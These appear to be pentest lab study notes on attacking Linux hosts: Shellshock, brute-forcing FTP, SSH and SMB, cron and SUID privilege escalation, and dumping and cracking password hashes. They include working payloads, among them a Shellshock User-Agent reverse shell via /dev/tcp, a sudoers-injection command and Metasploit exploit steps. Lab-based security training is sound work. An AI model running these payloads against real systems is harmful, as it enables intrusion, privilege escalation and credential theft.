# System Host Based Attacks - Linux

<br>

## 1. Exploiting Linux Vulnerabilities

### 1.1. Exploiting Bash CVE-2014-6271 Vulnerability (Shellshock)

**Shellshock** is a critical security vulnerability discovered in 2014 that affects the GNU Bash shell on Unix-based systems. It allows attackers to execute arbitrary commands by manipulating how Bash handles environment variables. If exploited successfully, it can lead to remote code execution (RCE) and potentially full system compromise.
- **Affected Versions**: GNU Bash versions 1.14 through 4.3 (prior to patches released in 2014).
- **Impact**: Attackers can inject malicious commands into environment variables processed by Bash, potentially leading to unauthorized access or control over the system.

```shell
nmap -Pn -A <target IP>
# Open the IP in the browser. We notice that there is a script whitin the site (CGI script)
curl <web_address>
<web_address>/gettime.cgi
```

A **CGI file** (Common Gateway Interface) is a script or program executed by a web server to generate dynamic content, such as processing form input, generating web pages, or handling requests. These scripts can be written in various programming languages, like Perl, Python, PHP, or Bash. 

```shell
ls -al /usr/share/nmap/scripts | grep -e "shellshock"
nmap --script-help "*shellshock*" # Visit: https://nmap.org/nsedoc/scripts/http-shellshock.html

# Check if the target is vulnerable by sending a malicious request to a specific URI.
nmap -sV --script http-shellshock --script-args uri=/gettime.cgi,cmd=ls <target_IP>
nmap -sV --script http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <target_IP>
```

**Exploit with Metasploit**

```shell
# Start Metasploit
search shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS <target_IP>
set LHOST <my_IP>
set TARGETURI <Path_to_CGI_script> # e.g. http://demo.ine.local/gettime.cgi
exploit
```

**Exploit with Burp**

```shell
# Activate the proxy using the extension in Firefox.
# Open BurpSuite > Proxy > Intercept is on.
# We are going to inject the special characters in User-Agent header.
# Send to the repeater.
User-Agent: () { :; } ; echo; echo; /bin/bash -c 'cat /etc/passwd'
# Click send.
# We can utilize bash to essencially connect to a listener on our Kali Linux. We can do this using netcat.
nc -nvlp <my-port-number>
User-Agent: () { :; } ; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
# We should get a reversal on our netcat listener.
whoami
cat /etc/*issue
```

### 1.2. Exploiting FTP

**FTP** (File Transfer Protocol) is a protocol that uses TCP port 21 and is used to facilitate file sharing between a server and client/clients.

**Objective** - Answer the following questions:
1) What is the version of FTP server?
2) Use the username dictionary 
	- /usr/share/metasploit-framework/data/wordlists/common_users.txt
	- /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	- List all found credentials.
3) Find the password of user “sysadmin” using nmap script.
4) Find seven flags hidden on the server.

```shell
ping -c 1 <target_IP>
nmap -sV <target_IP>
# 1) 21/tcp open ftp ProFTPD 1.3.5a

# We can also check this using nmap scripts.
ls -al /usr/share/nmap/scripts/ | grep ftp-*
nmap -p 21 --script <script_name> <target_IP>

# 2) Hydra command for performing a brute-force attack on the FTP service.
# -t4, this sets the number of parallel connections (threads) to 4.
hydra 
-L /usr/share/metasploit-framework/data/wordlists/common_users.txt
-P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
ftp://<target_IP> -t 4

# 3) Find the password of user “sysadmin” using nmap script.
nmap --script ftp-brute --script-args userdb=/root/users -p 21 <target_IP>

# 4) Establish a connection to the FTP service
ftp <target_IP>
<user>
<password>
# When executed, this command attempts to establish a connection to the FTP service running on the target machine. If successful, you'll be prompted to enter a username and password for authentication. Use the credentials found with Hydra.
dir
get secret.txt
exit
cat secret.txt
```

### 1.3. Exploiting SSH

**SSH (Secure Shell)** is a network protocol that allows secure access to remote systems over an unsecured network. It provides encrypted communication between a client and a server, typically used for remote administration, file transfers, and tunneling.

**Objective**: Your task is to run the following auxiliary modules against the target:
- auxiliary/scanner/ssh/ssh_version
- auxiliary/scanner/ssh/ssh_login

The following username and **password dictionary** will be useful:
- /usr/share/metasploit-framework/data/wordlists/common_users.txt 
- /usr/share/metasploit-framework/data/wordlists/common_passwords.txt

```shell
# Using Metasploit
msfconsole -q
use auxiliary/scanner/ssh/ssh_version
set RHOSTS <target_IP>
exploit

# Bruteforce with metasploit
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
exploit

sessions
sessions -i 1
find / -name "flag"
cat /flag

# Bruteforce with Hydra
hydra
-L /usr/share/metasploit-framework/data/wordlists/common_users.txt 
-P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
<target_IP> -t 4 ssh

# Acess SSH
ssh <username>@<target_IP>
ls /
find / -type f -name "*flag*" 2>/dev/null
cat /flag
```

### 1.4. Exploiting SAMBA

**SMB (Server Message Block)** is a network file sharing protocol that allows applications and users to read and write to files and request services from server programs in a computer network. In this lab we will look at the dictionary attack on SMB server.

**Objective**: Answer the following questions:

1. What is the password of user “jane” required to access share “jane”? 

*Use smb_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix_passwords.txt*

```shell
use scanner/smb/smb_login
set RHOSTS <target_IP>
set SMBuser jane
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
```

2. What is the password of user “admin” required to access share “admin”? 

*Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt*

```shell
# The command gzip -d /usr/share/wordlists/rockyou.txt.gz decompresses the rockyou.txt.gz file, extracting the plain text password list from its compressed .gz format for use in password attacks or brute-force tools.
gzip -d /usr/share/wordlists/rockyou.txt.gz

# Use Hydra
hydra 
-l admin 
-P /usr/share/wordlists/rockyou.txt.gz
<target_IP> 
smb
```

3. Which share is read only? Use smbmap with credentials obtained in question 2.

```shell
smbmap
smbmap -u <username> -p <password> -H <target_IP>
```

4. Is share “jane” browseable? Use credentials obtained from the 1st question.

```shell
smbclient -L <target_IP> -U jane
# Share "jane" is not listed. Checking whether jane share exists:
smbclient //<target_IP>/jane -U jane
# Share “Jane” exists but is not browsable.
```

5. Fetch the flag from share “admin”

```shell
smbclient //<target_IP>/admin -U admin
ls
cd hidden
ls
get flag.tar.gz
exit
tar -xf flag.tar.gz
cat flag
```

6. List the named pipes available over SMB on the samba server? Use pipe_auditor metasploit module with credentials obtained from question 2.

```shell
use auxiliary/scanner/smb/pipe_auditor
set RHOSTS <target_IP>
set SMBUser <username>
set SMBPass <password>
exploit
```

7. List SID of Unix users shawn, jane, nancy and admin respectively by performing RID cycling using enum4Linux with credentials obtained in question 2.

```shell
enum4linux -r -u "<username>" -p "<password>" <target_IP>
```

## 2. Linux Privilege Escalation

### 2.1. Exploiting Misconfigured Cron Jobs

**Cron** is a lifesaver for admins when it comes to doing periodic maintenance tasks on the system. They can even be used in cases where tasks are performed within individual user directories. However, such automations need to be used with caution or can lead to easy privilege escalation attacks.

**Objective**: Your mission is to get a root shell on the box and retrieve the flag!

```shell
ping -c 1 <target_IP>
#Open a browser and navigate to the following URL to explore the service running on port 8000:
http://target.ine.local:8000
# You should now see the Linux terminal interface running, confirming that the service is live and accessible.

# There is a message file in the home directory of student user. Only root user has permissions on this file. So, student user can’t even read it.
ls -l
# Find if a file with the same name exists on the system.
find / -name message
# Observe that a file with the same name is present in the /tmp directory. On checking closely, it is clear that this file is being overwritten every minute.
ls -l /tmp/
```

 This means there is some script/binary which is copying this file from the student home directory to /tmp directory. Search for that script. If this script is doing a simple copy operation, it must have the source destination of the file in it. Try to locate that by using the grep command. On trying on different directories one by one (i.e. /, etc, /opt) and on /usr directory, a match has been found.

```shell
grep -nri "/tmp/message" /usr
# `grep`: A command-line tool used to search for specific patterns in files.
# `-n`: Displays the line number in the file where the matching text is found.
# `-r`: Performs a recursive search, meaning it will search through all subdirectories under `/usr`.
# `-i`: Makes the search case-insensitive so it will match `/tmp/message`, `/TMP/MESSAGE`, `/Tmp/Message`, etc.
# `"/tmp/message"`: The search pattern, It looks for any instance of this exact text string.
# `/usr`: The starting directory for the search. The command will look through all files and subfolders within `/usr`.

# Check the permissions on this script file and its contents.
ls -l /usr/local/share/copy.sh
cat /usr/local/share/copy.sh
```

As the script file is writable by the current student user, it can be modified to execute our commands. This script is executed by root cron job, so it can do privileged operations. But, the file can’t be modified directly as there is no text editor on the system.

```shell
vim /usr/local/share/copy.sh
vi /usr/local/share/copy.sh
nano /usr/local/share/copy.sh
# command not found

# Use printf to replace the original code with the following lines.
printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh

# On execution, these lines will add a new entry to the /etc/sudoers file which will allow the student user to use sudo without providing any password.

cat /usr/local/share/copy.sh

# Check the current sudoers list.
sudo -l

# Switch to the root user using sudo.
sudo su

# Collect the flag from the root directory.
cd /root
ls -l
cat flag
```

### 2.2. Exploiting SUID Binaries

Vulnerable setuid on Linux systems could lead to privilege escalation attacks. In this lab, we will look at how to exploit them. On the target machine, you are provided a regular user account and need to escalate your privileges to become root. There are 2 programs in the home directory welcome and greetings which might be vulnerable.

**Objective:**
- Get a root shell on the system
- View /etc/shadow
- Retrieve the flag.

```shell
ping -c 1 <target_IP>
# Open firefox, and access the target machine's terminal at http://target.ine.local:8000
# Check the contents of the student's directory.
pwd
ls -l
# We see two binaries there, greeting and welcome. We can also notice the 's' which stants from SUID permission.
# -rwsr-xr-x 1 root root 8344 Sep 22 2018 welcome
```

Observe that the welcome binary has suid bit set (or on). This means that this binary and its child processes will run with root privileges. Check the file type.

```shell
file welcome
./greetings # We don't have the permission for this binary
# But we have for
./welcome
```

Investigate the binary. The most easy or preliminary way of doing that is to use strings command.

```shell
strings welcome
# We can see 'greetings' that it calls upon the greeting binery which is very interesting
```

Observe the greetings strings in the output of the strings command. It is possible that welcome binary is calling greetings binary. So, replace the greetings binary with some other binary (say /bin/bash) which should then also get executed as root.

```shell
# Delete greetings binary and then copy /bin/bash to its location and rename that to greetings.
rm greetings
cp /bin/bash greetings
ls

# Then, run the welcome binary again.
./welcome # Execute the bash with root privileges
id
whoami
```

Student user got escalate to root user. Retrieve the flag kept in /root directory.

```shell
ls
cat flag
```

## 3. Linux Credential Dumping

### 3.1. Password Cracker: Linux

All account information for users on a Linux system is stored in the `/etc/passwd` file. While this file contains user details, it does not display actual passwords since they are encrypted. Additionally, the `passwd` file is readable by any user on the system, meaning it does not store sensitive password data directly, but only the root user can modify it.

Passwords are stored in /etc/shadow, which is readable only by root.

- `/etc/shadow` → This file contains hashed passwords for all local users.
- `/etc/passwd` → Holds basic user info, but not the actual password hashes.

**Objective**: Run the following auxiliary module against the target:
- auxiliary/analyze/crack_linux

**Gain access to the system**

```shell
ping -c 1 <target_IP>
nmap -sV <target_IP>

searchsploit ProFTPD # Now check for the version detected by nmap
# We have discovered a proftpd 1.3.3c server running on the target machine. We will run nmap vuln script to identify the vulnerability.
nmap --script vuln -p 21 <target_IP>

service postgresql start && msfconsole # /etc/init.d/postgresql start
search proftpd
use exploit/unix/ftp/proftpd_133c_backdoor
set payload /cmd/unix/reverse # To be set first before the LHOST
set RHOSTS <target_IP>
set LHOST <local_IP>
exploit -z
# -z flag is used with the exploit command to run an exploit without interacting with a new session after execution
```

**Use the post exploitation module to dump the system users hashes**

```shell 
search hashdump
use post/linux/gather/hashdump
set SESSION 1
exploit
loot
```

**Run the provided auxiliary module to find the plain text password of the root user.**

```shell
search crack linux
use auxiliary/analyze/crack_linux
set SHA512 true
run
```

**Using John**

```shell
john --format=sha512crypt <hash_file> --wordlist=<wordlist>
```

The module does **not go out and find hashes by itself**. It depends on the fact that:
1. You (or a post-exploitation module) have already **dumped the hashes** (e.g., from `/etc/shadow`)
2. Metasploit **stored those hashes** in its internal database (via `loot`, `creds`, or `post modules`)
3. `analyze/crack_linux` reads those stored hashes and cracks them

**Example: **

root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:18348:0:99999:7:::
